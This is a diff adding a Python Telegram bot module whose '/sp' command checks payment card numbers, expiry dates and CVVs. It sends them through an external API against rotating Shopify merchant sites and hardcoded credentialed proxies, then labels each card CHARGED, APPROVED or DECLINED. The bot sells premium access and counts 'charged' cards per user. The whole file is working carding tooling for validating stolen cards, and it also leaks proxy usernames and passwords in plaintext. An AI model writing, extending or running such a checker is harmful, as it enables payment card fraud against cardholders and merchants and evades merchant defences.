@@ -1,0 +1,426 @@
+import asyncio
+import html
+import re
+import logging
+import aiohttp
+import json
+import time
+import random
+import os
+import psycopg2.extras
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# AIogram Imports
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+from aiogram import types, F, Router
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# LOCAL IMPORTS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+from database import is_gate_enabled, get_db_connection
+from bin import get_bin_info
+from sub import get_premium_status
+
+def to_math_bold(s: str) -> str:
+    bold_map = {
+        'a':'𝗮','b':'𝗯','c':'𝗰','d':'𝗱','e':'𝗲','f':'𝗳','g':'𝗴','h':'𝗵','i':'𝗶','j':'𝗷','k':'𝗸','l':'𝗹','m':'𝗺','n':'𝗻','o':'𝗼','p':'𝗽','q':'𝗾','r':'𝗿','s':'𝘀','t':'𝘁','u':'𝘂','v':'𝘃','w':'𝘄','x':'𝘅','y':'𝘆','z':'𝘇',
+        'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛','I':'𝗜','J':'𝗝','K':'𝗞','L':'𝗟','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣','Q':'𝗤','R':'𝗥','S':'𝗦','T':'𝗧','U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫','Y':'𝗬','Z':'𝗭',
+        '0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵'
+    }
+    return "".join(bold_map.get(c, c) for c in str(s))
+
+router = Router()
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# CONFIGURATION
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+API_URLS = [
+    "http://chirag-x-shopify-production.up.railway.app/shopify"
+]
+SITES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "mass_gates", "sites.txt")
+MAX_SITE_ROTATIONS = 20
+
+PROXY_LIST = [
+    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cz-pra.pvdata.host:8080",
+    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080",
+    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@co-bog.pvdata.host:8080",
+    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080",
+    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080",
+    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080",
+    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080",
+    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080",
+    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
+    "http://OR1673915314:LMf4JcDV@208.196.99.128:8813",
+    "http://naveed:Qwerty_123ABC@196.244.48.124:12345",
+    "http://1352:23CfS1Bz7oF0@p101.squidproxies.com:9094",
+    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-sto.pvdata.host:8080",
+]
+
+# Responses that mean "try a different site" — not a real card result
+RETRY_ERRORS = [
+    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
+    'product not found', 'hcaptcha detected', 'tax ammount empty',
+    'del ammount empty', 'product id is empty', 'py id empty',
+    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
+    'site error! status: 429', 'site requires login!', 'failed to get token',
+    'no valid products', 'not shopify!', 'site error! status: 404',
+    'site error! status: 401', 'site error! status: 402',
+    'failed to get checkout', 'captcha at checkout', 'site not supported',
+    'connection error', 'connection error!', 'error processing card',
+    '504', 'server error', 'client error', 'failed', 'amount_too_small',
+    'change proxy or site', 'token not found', 'invalid_response',
+    'resolve', 'item', 'curl error', 'could not resolve host',
+    'connect tunnel failed', 'invalid json in submit response', 'invalid json response', 'unknown result', 'payments_credit_card_generic',
+    'delivery_delivery_line_detail_changed',
+]
+
+# Custom Emoji IDs
+CUSTOM_CHARGED_EMOJI_ID = "5042050649248760772"
+CUSTOM_APPROVED_EMOJI_ID = "5039844895779455925"
+CUSTOM_DECLINED_EMOJI_ID = "4915853119839011973"
+
+# Rate limit tracker (trial users only)
+user_last_command_time: dict = {}
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# DATABASE HELPERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def ensure_stats_columns():
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        try:
+            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_checked INTEGER DEFAULT 0")
+        except Exception:
+            pass
+        try:
+            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_charged INTEGER DEFAULT 0")
+        except Exception:
+            pass
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        logging.error(f"[SP] Error checking stats columns: {e}")
+
+ensure_stats_columns()
+
+def update_user_stats_sync(user_id: int, is_charged: bool):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute(
+        "UPDATE users SET cc_checked = cc_checked + 1 WHERE user_id = %s",
+        (user_id,)
+    )
+    if is_charged:
+        cursor.execute(
+            "UPDATE users SET cc_charged = cc_charged + 1 WHERE user_id = %s",
+            (user_id,)
+        )
+    conn.commit()
+    conn.close()
+
+async def get_user_plan_name(user_id: int) -> str:
+    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
+    if is_premium:
+        try:
+            def _fetch():
+                conn = get_db_connection()
+                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
+                cursor.execute(
+                    "SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1",
+                    (user_id,)
+                )
+                row = cursor.fetchone()
+                conn.close()
+                if row:
+                    p = row["plan"].lower()
+                    if "laveyan" in p:
+                        return "𝑫𝒐𝒓𝒆𝒂𝒎𝒐𝒏<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji>"
+                    return row["plan"].upper()
+                return "𝗣𝗿𝗲𝗺𝗶𝘂𝗺"
+            return await asyncio.to_thread(_fetch)
+        except Exception as e:
+            logging.error(f"[SP] Error fetching plan name: {e}")
+        return "𝗣𝗿𝗲𝗺𝗶𝘂𝗺"
+    return "𝗧𝗿𝗶𝗮𝗹"
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# HELPERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def load_sites() -> list:
+    try:
+        if not os.path.exists(SITES_FILE):
+            return []
+        with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
+            sites = [line.strip() for line in f if line.strip()]
+            
+            # Filter banned sites
+            banned_path = os.path.join(os.path.dirname(SITES_FILE), "banned_sites.json")
+            if os.path.exists(banned_path):
+                try:
+                    import json
+                    with open(banned_path, "r", encoding="utf-8") as bf:
+                        banned = set(json.load(bf))
+                        sites = [s for s in sites if s not in banned]
+                except Exception as e:
+                    logging.error(f"[SP] Error loading banned sites: {e}")
+            return sites
+    except Exception as e:
+        logging.error(f"[SP] Error loading sites: {e}")
+        return []
+
+def luhn_check(card_number: str) -> bool:
+    card_number = str(card_number).strip()
+    if not card_number.isdigit():
+        return False
+    total = 0
+    for i, char in enumerate(card_number[::-1]):
+        digit = int(char)
+        if i % 2 == 1:
+            digit *= 2
+            if digit > 9:
+                digit -= 9
+        total += digit
+    return total % 10 == 0
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# COMMAND HANDLER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+@router.message(F.text.startswith("/sp"))
+async def sp_command(message: types.Message):
+    # ─── Gate check ─────────────────────────────────────────────────
+    if not await asyncio.to_thread(is_gate_enabled, "sp"):
+        await message.reply(
+            "<tg-emoji emoji-id='4958926882994127612'>🚧</tg-emoji> <b>𝗦𝗣 𝗚𝗮𝘁𝗲 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>",
+            parse_mode="HTML"
+        )
+        return
+
+    user = message.from_user
+    user_id = user.id
+    current_time = time.time()
+
+    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
+
+    # ─── Rate limit (trial users only) ──────────────────────────────
+    if not is_premium:
+        last = user_last_command_time.get(user_id, 0)
+        elapsed = current_time - last
+        if elapsed < 10:
+            remaining = round(10 - elapsed, 1)
+            await message.reply(
+                f"<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>𝗦𝗹𝗼𝘄 𝗗𝗼𝘄𝗻!</b>\n"
+                f"Wait <code>{remaining}s</code> before the next check.\n"
+                f"<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> Upgrade to Premium for instant access.",
+                parse_mode="HTML"
+            )
+            return
+        user_last_command_time[user_id] = current_time
+
+    # ─── Extract card from text or replied message ───────────────────
+    parts = message.text.split(maxsplit=1)
+    raw_text = parts[1].strip() if len(parts) > 1 else ""
+
+    if message.reply_to_message:
+        replied = message.reply_to_message
+        raw_text += " " + (replied.text or replied.caption or "")
+
+    if not raw_text.strip():
+        await message.reply(
+            "<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> <b>Usage:</b> /sp <code>cc|mm|yy|cvv</code>\n"
+            "Or reply to a message containing card details.",
+            parse_mode="HTML"
+        )
+        return
+
+    # ─── Parse card ──────────────────────────────────────────────────
+    pattern = r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})'
+    match = re.search(pattern, raw_text)
+    if not match:
+        await message.reply(
+            "<tg-emoji emoji-id='5456140674028019486'>🛑</tg-emoji> <b>Invalid Card Format.</b>\n"
+            "Please send as <code>4242424242424242|05|27|123</code>",
+            parse_mode="HTML"
+        )
+        return
+
+    cc, mm, yy_raw, cvv = match.groups()
+    mm = mm.zfill(2)
+    yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
+    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
+
+    # ─── Luhn check ──────────────────────────────────────────────────
+    if not luhn_check(cc):
+        await message.reply(
+            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>Invalid Card Number</b>\n"
+            "Luhn check failed.",
+            parse_mode="HTML"
+        )
+        return
+
+    # ─── Sites check ─────────────────────────────────────────────────
+    sites = load_sites()
+    if not sites:
+        await message.reply(
+            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No sites found in <code>sites.txt</code>.",
+            parse_mode="HTML"
+        )
+        return
+
+    plan_name = await get_user_plan_name(user_id)
+
+    user_link = f"<a href='tg://user?id={user_id}'>{user.first_name}</a>"
+    proc_msg = await message.reply(
+        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <code>1</code>\n"
+        f"<tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛ <code>0.0s</code>\n"
+        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_link}\n"
+        f"━━━━━━━━━━━━━━━━\n"
+        f"<tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> <b>𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸...</b>",
+        parse_mode="HTML"
+    )
+
+    asyncio.create_task(
+        process_sp_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name, sites)
+    )
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# BACKGROUND PROCESSOR
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+async def process_sp_check(
+    message: types.Message,
+    proc_msg: types.Message,
+    user: types.User,
+    user_id: int,
+    formatted_cc: str,
+    cc: str,
+    plan_name: str,
+    sites: list,
+):
+    import time
+    start_time = time.time()
+    api_result = {"Response": "UNKNOWN_ERROR"}
+    last_site = None
+
+    for _ in range(MAX_SITE_ROTATIONS):
+        # Pick a site different from last if possible
+        candidates = [s for s in sites if s != last_site] or sites
+        current_site = random.choice(candidates)
+        last_site = current_site
+
+        proxy = random.choice(PROXY_LIST)
+
+        try:
+            timeout = aiohttp.ClientTimeout(total=45)
+            params = {"site": current_site, "cc": formatted_cc, "proxy": proxy}
+            current_api = random.choice(API_URLS)
+            async with aiohttp.ClientSession() as session:
+                async with session.get(current_api, params=params, timeout=timeout) as resp:
+                    text = await resp.text()
+                    try:
+                        api_result = json.loads(text)
+                    except json.JSONDecodeError:
+                        api_result = {"Response": f"PARSE_ERROR"}
+        except Exception as e:
+            logging.error(f"[SP] API error ({current_site}): {e}")
+            api_result = {"Response": "CONNECTION_ERROR"}
+
+        response_lower = api_result.get("Response", "").lower()
+        should_rotate = any(err in response_lower for err in RETRY_ERRORS)
+        if not should_rotate:
+            break
+
+    # ─── BIN lookup ──────────────────────────────────────────────────
+    try:
+        bin_info = await get_bin_info(cc[:6])
+    except Exception:
+        bin_info = {}
+
+    bin_scheme = bin_info.get("scheme", "N/A")
+    card_type = bin_info.get("type", "N/A")
+    level = bin_info.get("level", "N/A")
+    bin_bank = bin_info.get("bank", "N/A")
+    country_name = bin_info.get("country", "N/A")
+    country_flag = bin_info.get("country_emoji", "")
+    bin_country = f"{country_flag} {country_name}".strip() if country_flag else country_name
+
+    # ─── Determine status ────────────────────────────────────────────
+    response_raw = api_result.get("Response", "").upper()
+    response_lower = response_raw.lower()
+    is_charged_stat = False
+
+    CHARGED_KEYWORDS = ["order_placed", "charged", "order_paid", "thank you", "thank_you"]
+    APPROVED_KEYWORDS = [
+        "3ds_required", "3d_authentication", "insufficient_funds",
+        "invalid_cvc", "incorrect_cvc", "invalid_zip", "incorrect_zip",
+    ]
+
+    is_technical_error = (
+        any(err in response_lower for err in RETRY_ERRORS)
+        or "error" in response_lower
+        or "timeout" in response_lower
+    )
+
+    if is_technical_error:
+        final_status = "𝗘𝗥𝗥𝗢𝗥 <tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji>"
+        credits_to_deduct = 0
+    elif any(k in response_lower for k in CHARGED_KEYWORDS):
+        final_status = f'𝗖𝗛𝗔𝗥𝗚𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">🔥</tg-emoji>'
+        is_charged_stat = True
+        credits_to_deduct = 1
+    elif any(k in response_lower for k in APPROVED_KEYWORDS):
+        final_status = f'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">🎁</tg-emoji>'
+        is_charged_stat = True
+        credits_to_deduct = 1
+    else:
+        final_status = f'𝗗𝗘𝗖𝗟𝗜𝗻𝗘𝗗 <tg-emoji emoji-id="4915853119839011973">⚠️</tg-emoji>'
+        credits_to_deduct = 1
+
+    # ─── Update stats ────────────────────────────────────────────────
+    await asyncio.to_thread(update_user_stats_sync, user_id, is_charged_stat)
+
+    # ─── Build result message ─────────────────────────────────────────
+    user_link = f'<a href="tg://user?id={user.id}">{user.first_name}</a>'
+    dev_link = '<a href="https://t.me/RohitRich">𝑫𝒐𝒓𝒆𝒂𝒎𝒐𝒏</a>'
+    user_display = f"{user_link} ({plan_name})"
+
+    elapsed = round(time.time() - start_time, 1)
+    final_caption = (
+        f"<b><tg-emoji emoji-id='5386367538735104399'>🆕</tg-emoji> {final_status}!</b>\n\n"
+        f"<b><tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> 𝗖𝗖:</b> <code><b>{formatted_cc}</b></code>\n"
+        f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲:</b> {to_math_bold("Shopify 1 USD")}\n"
+        f"<b><tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:</b> {to_math_bold(html.escape(str(response_raw or 'N/A')))}\n\n"
+        f"<b><tg-emoji emoji-id='5042329873662609701'>🗑️</tg-emoji> 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:</b>\n"
+        f"<b><tg-emoji emoji-id='5039753786638205957'>🔹</tg-emoji> 𝗕𝗿𝗮𝗻𝗱:</b> {to_math_bold(html.escape(str(bin_scheme or 'N/A')))}\n"
+        f"<b><tg-emoji emoji-id='5042020176455795565'>🔸</tg-emoji> 𝗧𝘆𝗽𝗲:</b> {to_math_bold(html.escape(str(card_type or 'N/A')))}\n"
+        f"<b><tg-emoji emoji-id='5042097984083330584'>🔘</tg-emoji> 𝗟𝗲𝘃𝗲𝗹:</b> {to_math_bold(html.escape(str(level or 'N/A')))}\n"
+        f"<b><tg-emoji emoji-id='5343636681473935403'>🏛️</tg-emoji> 𝗕𝗮𝗻𝗸:</b> {to_math_bold(html.escape(str(bin_bank or 'N/A')))}\n"
+        f"<b><tg-emoji emoji-id='5042176294222037888'>🌍</tg-emoji> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {to_math_bold(html.escape(str(bin_country or 'N/A')))}\n"
+        f"━━━━━━━━━━━━━━━━\n\n"
+        f"<b><tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <code>{elapsed}s</code>\n"
+        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> <b>𝗨𝘀𝗲𝗿 ➛</b> {user_display}\n"
+        f"<tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> <b>𝗗𝗲𝘃 ➛</b> {dev_link}"
+    )
+
+    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="𝑫𝒐𝒓𝒆𝒂𝒎𝒐𝒏", url="http://t.me/hchkCxcMainBot", icon_custom_emoji_id="5042097984083330584", style="primary")]
+    ])
+
+    try:
+        await proc_msg.edit_text(
+            text=final_caption,
+            parse_mode="HTML",
+            reply_markup=reply_markup
+        )
+    except Exception as e:
+        logging.error(f"[SP] Error editing message: {e}")
+        await message.reply(
+            text=final_caption,
+            parse_mode="HTML",
+            reply_markup=reply_markup
+        )
